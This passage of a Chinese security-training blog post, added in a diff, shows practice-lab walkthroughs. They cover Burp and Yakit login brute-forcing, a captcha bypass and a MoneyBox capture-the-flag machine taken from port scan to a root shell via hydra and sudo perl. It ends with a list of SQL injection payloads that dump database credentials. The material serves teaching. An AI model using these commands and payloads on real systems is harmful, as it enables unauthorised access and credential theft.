+<p>将数据库密码填好，在网址页面更新好数据库。</p>
+<h4 id="暴力破解1"><a href="#暴力破解1" class="headerlink" title="暴力破解1"></a>暴力破解1</h4><p>基于表单的暴力破解</p>
+<h5 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107191857461.png" alt="image-20240107191857461"></p>
+<p>随便填入账号密码，使用Burp抓包，放到重放器中</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105402.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105402.png"></p>
+<p>再发到Intruder中。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105430.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105430.png"></p>
+<p>再发到目标中。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105242.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105242.png"></p>
+<p>选择账号密码插入位置。</p>
+<p>攻击类型选择集束炸弹</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105615.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105615.png"></p>
+<p>payload集1，选择简单列表，下面内容直接输入两个简单账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105259.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105259.png"></p>
+<p>payload集2，选择简单列表，下面部分从“从列表中添加“，选择密码</p>
+<p>开始攻击</p>
+<p>等待一会</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105204.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105204.png"></p>
+<p>爆破成功。</p>
+<h5 id="yakit"><a href="#yakit" class="headerlink" title="yakit"></a>yakit</h5><p>使用方法与Burp大同小异</p>
+<p>使用内置浏览器抓包</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105642.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105642.png"></p>
+<p>随便输入账号密码进行登陆</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105927.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105927.png"></p>
+<p>将登陆页面发的post抓包发送到Web Fuzzer中</p>
+<p>!<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105905.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105905.png"></p>
+<p>选择账号密码部分，右键，插入字典进行爆破</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105953.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20105953.png"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110005.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110005.png"></p>
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110015.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110015.png"></p>
+<h4 id="暴力破解2"><a href="#暴力破解2" class="headerlink" title="暴力破解2"></a>暴力破解2</h4><p>验证码绕过（on server）</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107193730906.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107193730906.png"></p>
+<p>与暴力破解1相似，但是多了一个验证码</p>
+<p>我们可以随机输入账号密码，但是验证码要正确输入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110824.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110824.png"></p>
+<p>登陆，抓正确验证码的这个包</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110853.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110853.png"></p>
+<p>其他部分与暴力破解一相同，选择账号密码右键插入字典进行爆破</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110921.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20110921.png"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20111300.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-04%20111300.png"></p>
+<h4 id="暴力破解3"><a href="#暴力破解3" class="headerlink" title="暴力破解3"></a>暴力破解3</h4><p>验证码绕过（on client）</p>
+<p>与暴力破解2相似，但是用2的方法无法正常爆破</p>
+<p>查看源代码，发现验证码使用了js</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194458651.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194458651.png"></p>
+<p>那就禁用浏览器的js</p>
+<h6 id="Firefox浏览器"><a href="#Firefox浏览器" class="headerlink" title="Firefox浏览器"></a>Firefox浏览器</h6><p>F12-&gt;…-&gt;设置-&gt;禁用JavaScript</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194658900.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194658900.png"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194742684.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194742684.png"></p>
+<h6 id="Google浏览器"><a href="#Google浏览器" class="headerlink" title="Google浏览器"></a>Google浏览器</h6><p>F12-&gt;齿轮-&gt;Preferences-&gt;Debugger(最下面)-&gt;Disable JavaScript</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194920661.png" alt="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107194920661.png"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107195024306.png" alt="image-20240107195024306"></p>
+<p>其他部分与爆破2相似。</p>
+<h3 id="moneybox"><a href="#moneybox" class="headerlink" title="moneybox"></a>moneybox</h3><ul>
+<li>寻找flag</li>
+</ul>
+<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>下载Oracle VM VirtualBox以及MoneyBox.ova</p>
+<p>安装好Oracle VM VirtualBox后，管理-&gt;导入虚拟电脑</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107202650712.png" alt="image-20240107202650712"></p>
+<p>选择MoneyBox.ova</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107202733689.png" alt="image-20240107202733689"></p>
+<p>更改该虚拟机设置</p>
+<p>USB设备选择USB1.1</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107202752278.png" alt="image-20240107202752278"></p>
+<p>网络如图更改</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107202853671.png" alt="image-20240107202853671"></p>
+<p>打开该虚拟机就不用管它了</p>
+<p>VM网络设置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107203045496.png" alt="image-20240107203045496"></p>
+<p>kali网络设置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107203140928.png" alt="image-20240107203140928"></p>
+<p>再在kali中运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0</span><br><span class="line">ifup eth0</span><br></pre></td></tr></table></figure>
+
+<p>重置eth0网络 </p>
+<p>配置完成。</p>
+<h4 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>判断eth0下有哪些主机</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107204448873.png" alt="image-20240107204448873"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107204526762.png" alt="image-20240107204526762"></p>
+<p>访问靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107204802308.png" alt="image-20240107204802308"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107204849933.png" alt="image-20240107204849933"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-1000 192.168.56.101 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107204948710.png" alt="image-20240107204948710"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -Sc 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205104288.png" alt="image-20240107205104288"></p>
+<p>21端口的ftp有点问题，该端口下有一张trytofind.jpg的图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.56.101&quot; -x 403,404</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205331921.png" alt="image-20240107205331921"></p>
+<p>该网站下有一个&#x2F;blogs的子页面，直接进入查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101/blogs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205437528.png" alt="image-20240107205437528"></p>
+<p>查看源代码，下翻有内容</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205524402.png" alt="image-20240107205524402"></p>
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101/S3cr3t-T3xt/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205652765.png" alt="image-20240107205652765"></p>
+<p>右键查看源代码</p>
+<p>下滑看到一个密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205734485.png" alt="image-20240107205734485"></p>
+<p>进入kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205859719.png" alt="image-20240107205859719"></p>
+<p>密码不用填，直接enter</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107205935385.png" alt="image-20240107205935385"></p>
+<p>成功进入ftp中</p>
+<p>刚刚我们在上面看到ftp中有一张trytofind.jpg的图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210056285.png" alt="image-20240107210056285"></p>
+<p>把图片下载到kali中</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/trytofind.jpg" alt="trytofind"></p>
+<p><strong>一只猫</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210408678.png" alt="image-20240107210408678"></p>
+<p>发现图片里有东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p>查询图片里隐藏的东西</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210543323.png" alt="image-20240107210543323"></p>
+<p>需要我们安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install steghide</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210639040.png" alt="image-20240107210639040"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p>查询图片中是否藏在东西</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210758739.png" alt="image-20240107210758739"></p>
+<p>确定藏在东西</p>
+<p>分离出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107210920968.png" alt="image-20240107210920968"></p>
+<p>输入密钥</p>
+<p>在192.168.56.101&#x2F;S3cr3t-T3xt&#x2F;里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3xtr4ctd4t4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211021636.png" alt="image-20240107211021636"></p>
+<p>分离出来一个data.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat data.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看data.txt</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211110057.png" alt="image-20240107211110057"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt</span><br><span class="line">ssh://192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p>试出了密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211339069.png" alt="image-20240107211339069"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">renu</span><br><span class="line">987654321</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211456356.png" alt="image-20240107211456356"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211547545.png" alt="image-20240107211547545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211559146.png" alt="image-20240107211559146"></p>
+<p>找到一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211708324.png" alt="image-20240107211708324"></p>
+<p>成功登陆另一个账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211746453.png" alt="image-20240107211746453"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211810350.png" alt="image-20240107211810350"></p>
+<p>得到第二个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107211907960.png" alt="image-20240107211907960"></p>
+<p>发现&#x2F;usr&#x2F;bin&#x2F;perl可以直接运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107212033682.png" alt="image-20240107212033682"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107212047978.png" alt="image-20240107212047978"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107212111053.png" alt="image-20240107212111053"></p>
+<p>发现一个txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240107212200023.png" alt="image-20240107212200023"></p>
+<p>成功找到最后一个flag</p>
+<h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
+<p>?id&#x3D;1’– -</p>
+<p>?id&#x3D;1’order by 3– -</p>
+<p>?id&#x3D;-1’union select 1,2,3–+</p>
+<p>?id&#x3D;-1’union select 1,database(),version()–+</p>
+<p>?id&#x3D;-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+</p>
+<p>?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
+<p>id&#x3D;1’and ascii(substring(database(),1,1))&#x3D;115–+（判断字符语句）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5-%E7%88%86%E7%A0%B4-moneybox/" data-id="clrcswxkj000fugwka2x1caij" data-title="9.1-sql注入-爆破-moneybox" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
